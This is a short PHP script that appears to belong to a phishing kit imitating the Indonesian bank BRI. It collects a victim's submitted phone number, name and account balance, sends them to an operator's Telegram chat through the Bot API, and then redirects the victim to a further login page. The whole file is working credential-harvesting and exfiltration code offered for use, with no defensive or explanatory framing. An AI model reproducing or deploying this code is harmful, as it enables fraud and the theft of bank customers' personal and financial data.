<?php 



session_start();
include "./telegram.php";

$_SESSION['phoneNumber'] = $_POST;

$message = "༺═★⊱━━ⒷⓇⒾ━━⊰★═༻". "\n✮ 𝗡𝗼𝗺𝗼𝗿 𝗛𝗽 : ".  $_POST['nomor']. "\n✮ 𝗡𝗮𝗺𝗮 : ". $_POST ['nama']. "\n✮ 𝗦𝗮𝗹𝗱𝗼 : ". $_POST ['saldo'];
function sendMessage($telegram_id, $message, $id_bot)
{
$url = "https://api.telegram.org/bot" . $id_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($telegram_id, $message, $id_bot);
header("Location: login.html");
?> 